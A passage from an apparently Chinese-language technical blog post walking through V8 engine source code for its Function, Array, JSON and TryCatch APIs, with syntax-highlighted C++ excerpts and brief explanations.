class="hljs-keyword">reinterpret_cast</span>&lt;i::Handle&lt;i::Object&gt;*&gt;(argv);<br>  Local&lt;Object&gt; result;<br>  has_pending_exception = !<span class="hljs-built_in">ToLocal</span>&lt;Object&gt;(<br>      i::Execution::<span class="hljs-built_in">New</span>(isolate, self, self, argc, args), &amp;result);<br>  <span class="hljs-keyword">if</span> (should_set_has_no_side_effect) &#123;<br>    i::Object obj =<br>        i::JSFunction::<span class="hljs-built_in">cast</span>(*self).<span class="hljs-built_in">shared</span>().<span class="hljs-built_in">get_api_func_data</span>().<span class="hljs-built_in">call_code</span>(<br>            kAcquireLoad);<br>    <span class="hljs-keyword">if</span> (obj.<span class="hljs-built_in">IsCallHandlerInfo</span>()) &#123;<br>      i::CallHandlerInfo handler_info = i::CallHandlerInfo::<span class="hljs-built_in">cast</span>(obj);<br>      <span class="hljs-keyword">if</span> (has_pending_exception) &#123;<br>        <span class="hljs-comment">// Restore the map if an exception prevented restoration.</span><br>        handler_info.<span class="hljs-built_in">NextCallHasNoSideEffect</span>();<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">DCHECK</span>(handler_info.<span class="hljs-built_in">IsSideEffectCallHandlerInfo</span>() ||<br>               handler_info.<span class="hljs-built_in">IsSideEffectFreeCallHandlerInfo</span>());<br>      &#125;<br>    &#125;<br>  &#125;<br>  <span class="hljs-built_in">RETURN_ON_FAILED_EXECUTION</span>(Object);<br>  <span class="hljs-built_in">RETURN_ESCAPED</span>(result);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="函数名操作name">函数名操作(Name)</h3><p>获取函数名：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">Local&lt;Value&gt; <span class="hljs-title">Function::GetName</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123;<br>  <span class="hljs-keyword">auto</span> self = Utils::<span class="hljs-built_in">OpenHandle</span>(<span class="hljs-keyword">this</span>);<br>  i::Isolate* isolate = self-&gt;<span class="hljs-built_in">GetIsolate</span>();<br>  <span class="hljs-keyword">if</span> (self-&gt;<span class="hljs-built_in">IsJSBoundFunction</span>()) &#123;<br>    <span class="hljs-keyword">auto</span> func = i::Handle&lt;i::JSBoundFunction&gt;::<span class="hljs-built_in">cast</span>(self);<br>    i::Handle&lt;i::Object&gt; name;<br>    <span class="hljs-built_in">ASSIGN_RETURN_ON_EXCEPTION_VALUE</span>(isolate, name,<br>                                     i::JSBoundFunction::<span class="hljs-built_in">GetName</span>(isolate, func),<br>                                     <span class="hljs-built_in">Local</span>&lt;Value&gt;());<br>    <span class="hljs-keyword">return</span> Utils::<span class="hljs-built_in">ToLocal</span>(name);<br>  &#125;<br>  <span class="hljs-keyword">if</span> (self-&gt;<span class="hljs-built_in">IsJSFunction</span>()) &#123;<br>    <span class="hljs-keyword">auto</span> func = i::Handle&lt;i::JSFunction&gt;::<span class="hljs-built_in">cast</span>(self);<br>    <span class="hljs-keyword">return</span> Utils::<span class="hljs-built_in">ToLocal</span>(<span class="hljs-built_in">handle</span>(func-&gt;<span class="hljs-built_in">shared</span>().<span class="hljs-built_in">Name</span>(), isolate));<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">ToApiHandle</span>&lt;Primitive&gt;(isolate-&gt;<span class="hljs-built_in">factory</span>()-&gt;<span class="hljs-built_in">undefined_value</span>());<br>&#125;<br></code></pre></td></tr></table></figure><p>设置更改函数名：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Function::SetName</span><span class="hljs-params">(v8::Local&lt;v8::String&gt; name)</span> </span>&#123;<br>  <span class="hljs-keyword">auto</span> self = Utils::<span class="hljs-built_in">OpenHandle</span>(<span class="hljs-keyword">this</span>);<br>  <span class="hljs-keyword">if</span> (!self-&gt;<span class="hljs-built_in">IsJSFunction</span>()) <span class="hljs-keyword">return</span>;<br>  <span class="hljs-keyword">auto</span> func = i::Handle&lt;i::JSFunction&gt;::<span class="hljs-built_in">cast</span>(self);<br>  <span class="hljs-built_in">ASSERT_NO_SCRIPT_NO_EXCEPTION</span>(func-&gt;<span class="hljs-built_in">GetIsolate</span>());<br>  func-&gt;<span class="hljs-built_in">shared</span>().<span class="hljs-built_in">SetName</span>(*Utils::<span class="hljs-built_in">OpenHandle</span>(*name));<br>&#125;<br></code></pre></td></tr></table></figure><p>还有一些特定用途（如Debug）的函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">Local&lt;Value&gt; <span class="hljs-title">Function::GetInferredName</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123;<br>  <span class="hljs-keyword">auto</span> self = Utils::<span class="hljs-built_in">OpenHandle</span>(<span class="hljs-keyword">this</span>);<br>  <span class="hljs-keyword">if</span> (!self-&gt;<span class="hljs-built_in">IsJSFunction</span>()) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">ToApiHandle</span>&lt;Primitive&gt;(<br>        self-&gt;<span class="hljs-built_in">GetIsolate</span>()-&gt;<span class="hljs-built_in">factory</span>()-&gt;<span class="hljs-built_in">undefined_value</span>());<br>  &#125;<br>  <span class="hljs-keyword">auto</span> func = i::Handle&lt;i::JSFunction&gt;::<span class="hljs-built_in">cast</span>(self);<br>  <span class="hljs-keyword">return</span> Utils::<span class="hljs-built_in">ToLocal</span>(<br>      i::<span class="hljs-built_in">Handle</span>&lt;i::Object&gt;(func-&gt;<span class="hljs-built_in">shared</span>().<span class="hljs-built_in">inferred_name</span>(), func-&gt;<span class="hljs-built_in">GetIsolate</span>()));<br>&#125;<br><br><span class="hljs-function">Local&lt;Value&gt; <span class="hljs-title">Function::GetDebugName</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123;<br>  <span class="hljs-keyword">auto</span> self = Utils::<span class="hljs-built_in">OpenHandle</span>(<span class="hljs-keyword">this</span>);<br>  <span class="hljs-keyword">if</span> (!self-&gt;<span class="hljs-built_in">IsJSFunction</span>()) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">ToApiHandle</span>&lt;Primitive&gt;(<br>        self-&gt;<span class="hljs-built_in">GetIsolate</span>()-&gt;<span class="hljs-built_in">factory</span>()-&gt;<span class="hljs-built_in">undefined_value</span>());<br>  &#125;<br>  <span class="hljs-keyword">auto</span> func = i::Handle&lt;i::JSFunction&gt;::<span class="hljs-built_in">cast</span>(self);<br>  i::Handle&lt;i::String&gt; name = i::JSFunction::<span class="hljs-built_in">GetDebugName</span>(func);<br>  <span class="hljs-keyword">return</span> Utils::<span class="hljs-built_in">ToLocal</span>(i::<span class="hljs-built_in">Handle</span>&lt;i::Object&gt;(*name, self-&gt;<span class="hljs-built_in">GetIsolate</span>()));<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="数组array">数组（Array）</h2><p>数组也继承自对象，通常在转换的时候由句柄的<code>As</code>函数来完成。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">V8_EXPORT</span> Array : <span class="hljs-keyword">public</span> Object &#123;<br> <span class="hljs-keyword">public</span>:<br>  <span class="hljs-function"><span class="hljs-type">uint32_t</span> <span class="hljs-title">Length</span><span class="hljs-params">()</span> <span class="hljs-type">const</span></span>;<br><br>  <span class="hljs-comment">/**</span><br><span class="hljs-comment">   * Creates a JavaScript array with the given length. If the length</span><br><span class="hljs-comment">   * is negative the returned array will have length 0.</span><br><span class="hljs-comment">   */</span><br>  <span class="hljs-function"><span class="hljs-type">static</span> Local&lt;Array&gt; <span class="hljs-title">New</span><span class="hljs-params">(Isolate* isolate, <span class="hljs-type">int</span> length = <span class="hljs-number">0</span>)</span></span>;<br><br>  <span class="hljs-comment">/**</span><br><span class="hljs-comment">   * Creates a JavaScript array out of a Local&lt;Value&gt; array in C++</span><br><span class="hljs-comment">   * with a known length.</span><br><span class="hljs-comment">   */</span><br>  <span class="hljs-function"><span class="hljs-type">static</span> Local&lt;Array&gt; <span class="hljs-title">New</span><span class="hljs-params">(Isolate* isolate, Local&lt;Value&gt;* elements,</span></span><br><span class="hljs-params"><span class="hljs-function">                          <span class="hljs-type">size_t</span> length)</span></span>;<br>  <span class="hljs-function">V8_INLINE <span class="hljs-type">static</span> Array* <span class="hljs-title">Cast</span><span class="hljs-params">(Value* obj)</span></span>;<br><br> <span class="hljs-keyword">private</span>:<br>  <span class="hljs-built_in">Array</span>();<br>  <span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">CheckCast</span><span class="hljs-params">(Value* obj)</span></span>;<br>&#125;;<br></code></pre></td></tr></table></figure><p>主要介绍一下<code>Array</code>的几个常用API：</p><h3 id="new">New</h3><p>与对象不同的是，数组的<code>New</code>函数还可以多带一个参数，代表该数组的长度。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c++">Local&lt;v8::Array&gt; v8::Array::<span class="hljs-built_in">New</span>(Isolate* isolate, <span class="hljs-type">int</span> length) &#123;<br>  i::Isolate* i_isolate = <span class="hljs-built_in">reinterpret_cast</span>&lt;i::Isolate*&gt;(isolate);<br>  <span class="hljs-built_in">LOG_API</span>(i_isolate, Array, New);<br>  <span class="hljs-built_in">ENTER_V8_NO_SCRIPT_NO_EXCEPTION</span>(i_isolate);<br>  <span class="hljs-type">int</span> real_length = length &gt; <span class="hljs-number">0</span> ? length : <span class="hljs-number">0</span>;<br>  i::Handle&lt;i::JSArray&gt; obj = i_isolate-&gt;<span class="hljs-built_in">factory</span>()-&gt;<span class="hljs-built_in">NewJSArray</span>(real_length);<br>  i::Handle&lt;i::Object&gt; length_obj =<br>      i_isolate-&gt;<span class="hljs-built_in">factory</span>()-&gt;<span class="hljs-built_in">NewNumberFromInt</span>(real_length);<br>  obj-&gt;<span class="hljs-built_in">set_length</span>(*length_obj);<br>  <span class="hljs-keyword">return</span> Utils::<span class="hljs-built_in">ToLocal</span>(obj);<br>&#125;<br><br>Local&lt;v8::Array&gt; v8::Array::<span class="hljs-built_in">New</span>(Isolate* isolate, Local&lt;Value&gt;* elements,<br>                                <span class="hljs-type">size_t</span> length) &#123;<br>  i::Isolate* i_isolate = <span class="hljs-built_in">reinterpret_cast</span>&lt;i::Isolate*&gt;(isolate);<br>  i::Factory* factory = i_isolate-&gt;<span class="hljs-built_in">factory</span>();<br>  <span class="hljs-built_in">LOG_API</span>(i_isolate, Array, New);<br>  <span class="hljs-built_in">ENTER_V8_NO_SCRIPT_NO_EXCEPTION</span>(i_isolate);<br>  <span class="hljs-type">int</span> len = <span class="hljs-built_in">static_cast</span>&lt;<span class="hljs-type">int</span>&gt;(length);<br><br>  i::Handle&lt;i::FixedArray&gt; result = factory-&gt;<span class="hljs-built_in">NewFixedArray</span>(len);<br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; len; i++) &#123;<br>    i::Handle&lt;i::Object&gt; element = Utils::<span class="hljs-built_in">OpenHandle</span>(*elements[i]);<br>    result-&gt;<span class="hljs-built_in">set</span>(i, *element);<br>  &#125;<br><br>  <span class="hljs-keyword">return</span> Utils::<span class="hljs-built_in">ToLocal</span>(<br>      factory-&gt;<span class="hljs-built_in">NewJSArrayWithElements</span>(result, i::PACKED_ELEMENTS, len));<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="set与get">Set与Get</h3><p>主要使用下标的形式来设置和获取</p><h3 id="length">Length</h3><p>获取数组的长度：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">uint32_t</span> v8::Array::<span class="hljs-built_in">Length</span>() <span class="hljs-type">const</span> &#123;<br>  i::Handle&lt;i::JSArray&gt; obj = Utils::<span class="hljs-built_in">OpenHandle</span>(<span class="hljs-keyword">this</span>);<br>  i::Object length = obj-&gt;<span class="hljs-built_in">length</span>();<br>  <span class="hljs-keyword">if</span> (length.<span class="hljs-built_in">IsSmi</span>()) &#123;<br>    <span class="hljs-keyword">return</span> i::Smi::<span class="hljs-built_in">ToInt</span>(length);<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">static_cast</span>&lt;<span class="hljs-type">uint32_t</span>&gt;(length.<span class="hljs-built_in">Number</span>());<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="json解析器">JSON解析器</h2><p>Chrome V8的JSON解析器也充满了黑科技，它在V8中是一个类：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c++\">class V8_EXPORT JSON &#123;<br> public:<br>  /**<br>   * Tries to parse the string |json_string| and returns it as value if<br>   * successful.<br>   *<br>   * \param the context in which to parse and create the value.<br>   * \param json_string The string to parse.<br>   * \return The corresponding value if successfully parsed.<br>   */<br>  static V8_WARN_UNUSED_RESULT MaybeLocal&lt;Value&gt; Parse(<br>      Local&lt;Context&gt; context, Local&lt;String&gt; json_string);<br><br>  /**<br>   * Tries to stringify the JSON-serializable object |json_object| and returns<br>   * it as string if successful.<br>   *<br>   * \param json_object The JSON-serializable object to stringify.<br>   * \return The corresponding string if successfully stringified.<br>   */<br>  static V8_WARN_UNUSED_RESULT MaybeLocal&lt;String&gt; Stringify(<br>      Local&lt;Context&gt; context, Local&lt;Value&gt; json_object,<br>      Local&lt;String&gt; gap = Local&lt;String&gt;());<br>&#125;;<br></code></pre></td></tr></table></figure><p>主要使用<code>Parse</code>和<code>Stringify</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">MaybeLocal&lt;Value&gt; <span class="hljs-title">JSON::Parse</span><span class="hljs-params">(Local&lt;Context&gt; context,</span></span><br><span class="hljs-params"><span class="hljs-function">                              Local&lt;String&gt; json_string)</span> </span>&#123;<br>  <span class="hljs-built_in">PREPARE_FOR_EXECUTION</span>(context, JSON, Parse, Value);<br>  i::Handle&lt;i::String&gt; string = Utils::<span class="hljs-built_in">OpenHandle</span>(*json_string);<br>  i::Handle&lt;i::String&gt; source = i::String::<span class="hljs-built_in">Flatten</span>(isolate, string);<br>  i::Handle&lt;i::Object&gt; undefined = isolate-&gt;<span class="hljs-built_in">factory</span>()-&gt;<span class="hljs-built_in">undefined_value</span>();<br>  <span class="hljs-keyword">auto</span> maybe = source-&gt;<span class="hljs-built_in">IsOneByteRepresentation</span>()<br>                   ? i::JsonParser&lt;<span class="hljs-type">uint8_t</span>&gt;::<span class="hljs-built_in">Parse</span>(isolate, source, undefined)<br>                   : i::JsonParser&lt;<span class="hljs-type">uint16_t</span>&gt;::<span class="hljs-built_in">Parse</span>(isolate, source, undefined);<br>  Local&lt;Value&gt; result;<br>  has_pending_exception = !<span class="hljs-built_in">ToLocal</span>&lt;Value&gt;(maybe, &amp;result);<br>  <span class="hljs-built_in">RETURN_ON_FAILED_EXECUTION</span>(Value);<br>  <span class="hljs-built_in">RETURN_ESCAPED</span>(result);<br>&#125;<br><br><span class="hljs-function">MaybeLocal&lt;String&gt; <span class="hljs-title">JSON::Stringify</span><span class="hljs-params">(Local&lt;Context&gt; context,</span></span><br><span class="hljs-params"><span class="hljs-function">                                   Local&lt;Value&gt; json_object,</span></span><br><span class="hljs-params"><span class="hljs-function">                                   Local&lt;String&gt; gap)</span> </span>&#123;<br>  <span class="hljs-built_in">PREPARE_FOR_EXECUTION</span>(context, JSON, Stringify, String);<br>  i::Handle&lt;i::Object&gt; object = Utils::<span class="hljs-built_in">OpenHandle</span>(*json_object);<br>  i::Handle&lt;i::Object&gt; replacer = isolate-&gt;<span class="hljs-built_in">factory</span>()-&gt;<span class="hljs-built_in">undefined_value</span>();<br>  i::Handle&lt;i::String&gt; gap_string = gap.<span class="hljs-built_in">IsEmpty</span>()<br>                                        ? isolate-&gt;<span class="hljs-built_in">factory</span>()-&gt;<span class="hljs-built_in">empty_string</span>()<br>                                        : Utils::<span class="hljs-built_in">OpenHandle</span>(*gap);<br>  i::Handle&lt;i::Object&gt; maybe;<br>  has_pending_exception =<br>      !i::<span class="hljs-built_in">JsonStringify</span>(isolate, object, replacer, gap_string).<span class="hljs-built_in">ToHandle</span>(&amp;maybe);<br>  <span class="hljs-built_in">RETURN_ON_FAILED_EXECUTION</span>(String);<br>  Local&lt;String&gt; result;<br>  has_pending_exception =<br>      !<span class="hljs-built_in">ToLocal</span>&lt;String&gt;(i::Object::<span class="hljs-built_in">ToString</span>(isolate, maybe), &amp;result);<br>  <span class="hljs-built_in">RETURN_ON_FAILED_EXECUTION</span>(String);<br>  <span class="hljs-built_in">RETURN_ESCAPED</span>(result);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="异常机制">异常机制</h1><p><code>TryCatch</code>是V8中一个捕获异常的类，管理其生命周期中V8层面异常。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">V8_EXPORT</span> TryCatch &#123;<br> <span class="hljs-keyword">public</span>:<br>  <span class="hljs-comment">/**</span><br><span class="hljs-comment">   * Creates a new try/catch block and registers it with v8.  Note that</span><br><span class="hljs-comment">   * all TryCatch blocks should be stack allocated because the memory</span><br><span class="hljs-comment">   * location itself is compared against JavaScript try/catch blocks.</span><br><span class="hljs-comment">   */</span><br>  <span class="hljs-function"><span class="hljs-keyword">explicit</span> <span class="hljs-title">TryCatch</span><span class="hljs-params">(Isolate* isolate)</span></span>;<br><br>  <span class="hljs-comment">/**</span><br><span class="hljs-comment">   * Unregisters and deletes this try/catch block.</span><br><span class="hljs-comment">   */</span><br>  ~<span class="hljs-built_in">TryCatch</span>();<br><br>  <span class="hljs-comment">/**</span><br><span class="hljs-comment">   * Returns true if an exception has been caught by this try/catch block.</span><br><span class="hljs-comment">   */</span><br>  <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">HasCaught</span><span class="hljs-params">()</span> <span class="hljs-type">const</span></span>;<br><br>  <span class="hljs-comment">/**</span><br><span class="hljs-comment">   * For certain types of exceptions, it makes no sense to continue execution.</span><br><span class="hljs-comment">   *</span><br><span class="hljs-comment">   * If CanContinue returns false, the correct action is to perform any C++</span><br><span class="hljs-comment">   * cleanup needed and then return.  If CanContinue returns false and</span><br><span class="hljs-comment">   * HasTerminated returns true, it is possible to call</span><br><span class="hljs-comment">   * CancelTerminateExecution in order to continue calling into the engine.</span><br><span class="hljs-comment">   */</span><br>  <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">CanContinue</span><span class="hljs-params">()</span> <span class="hljs-type">const</span></span>;<br><br>  <span class="hljs-comment">/**</span><br><span class="hljs-comment">   * Returns true if an exception has been caught due to script execution</span><br><span class="hljs-comment">   * being terminated.</span><br><span class="hljs-comment">   *</span><br><span class="hljs-comment">   * There is no JavaScript representation of an execution termination</span><br><span class="hljs-comment">   * exception.  Such exceptions are thrown when the TerminateExecution</span><br><span class="hljs-comment">   * methods are called to terminate a long-running script.</span><br><span class="hljs-comment">   *</span><br><span class="hljs-comment">   * If such an exception has been thrown, HasTerminated will return true,</span><br><span class="hljs-comment">   * indicating that it is possible to call CancelTerminateExecution in order</span><br><span class="hljs-comment">   * to continue calling into the engine.</span><br><span class="hljs-comment">   */</span><br>  <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">HasTerminated</span><span class="hljs-params">()</span> <span class="hljs-type">const</span></span>;<br><br>  <span class="hljs-comment">/**</span><br><span class="hljs-comment">   * Throws the exception caught by this TryCatch in a way that avoids</span><br><span class="hljs-comment">   * it being caught again by this same TryCatch.  As with ThrowException</span><br><span class="hljs-comment">   * it is illegal to execute any JavaScript operations after calling</span><br><span class="hljs-comment">   * ReThrow; the caller must return immediately to where the exception</span><br><span class="hljs-comment">   * is caught.</span><br><span class="hljs-comment">   */</span><br>  <span class="hljs-function">Local&lt;Value&gt; <span class="hljs-title">ReThrow</span><span class="hljs-params">()</span></span>;<br><br>  <span class="hljs-comment">/**</span><br><span class="hljs-comment">   * Returns the exception caught by this try/catch block.  If no exception has</span><br><span class="hljs-comment">   * been caught an empty handle is returned.</span><br><span class="hljs-comment">   */</span><br>  <span class="hljs-function">Local&lt;Value&gt; <span class="hljs-title">Exception</span><span class="hljs-params">()</span> <span class="hljs-type">const</span></span>;<br><br>  <span class="hljs-comment">/**</span><br><span class="hljs-comment">   * Returns the .stack property of an object.  If no .stack</span><br><span class="hljs-comment">   * property is present an empty handle is returned.</span><br><span class="hljs-comment">   */</span><br>  <span class="hljs-function">V8_WARN_UNUSED_RESULT <span class="hljs-type">static</span> MaybeLocal&lt;Value&gt; <span class="hljs-title">StackTrace</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">      Local&lt;Context&gt; context, Local&lt;Value&gt; exception)</span></span>;<br><br>  <span class="hljs-comment">/**</span><br><span class="hljs-comment">   * Returns the .stack property of the thrown object.  If no .stack property is</span><br><span class="hljs-comment">   * present or if this try/catch block has not caught an exception, an empty</span><br><span class="hljs-comment">   * handle is returned.</span><br><span class="hljs-comment">   */</span><br>  <span class="hljs-function">V8_WARN_UNUSED_RESULT MaybeLocal&lt;Value&gt; <span class="hljs-title">StackTrace</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">      Local&lt;Context&gt; context)</span> <span class="hljs-type">const</span></span>;<br><br>  <span class="hljs-comment">/**</span><br><span class="hljs-comment">   * Returns the message associated with this exception.  If there is</span><br><span class="hljs-comment">   * no message associated an empty handle is returned.</span><br><span class="hljs-comment">   */</span><br>  <span class="hljs-function">Local&lt;v8::Message&gt; <span class="hljs-title">Message</span><span class="hljs-params">()</span> <span class="hljs-type">const</span></span>;<br><br>  <span class="hljs-comment">/**</span><br><span class="hljs-comment">   * Clears any exceptions that may have been caught by this try/catch block.</span><br><span class="hljs-comment">   * After this method has been called, HasCaught() will return false. Cancels</span><br><span class="hljs-comment">   * the scheduled exception if it is caught and ReThrow() is not called before.</span><br><span class="hljs-comment">   *</span><br><span class="hljs-comment">   * It is not necessary to clear a try/catch block before using it again; if</span><br><span class="hljs-comment">   * another exception is thrown the previously caught exception will just be</span><br><span class="hljs-comment">   * overwritten.  However, it is often a good idea since it makes it easier</span><br><span class="hljs-comment">   * to determine which operation threw a given exception.</span><br><span class="hljs-comment">   */</span><br>  <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Reset</span><span class="hljs-params">()</span></span>;<br><br>  <span 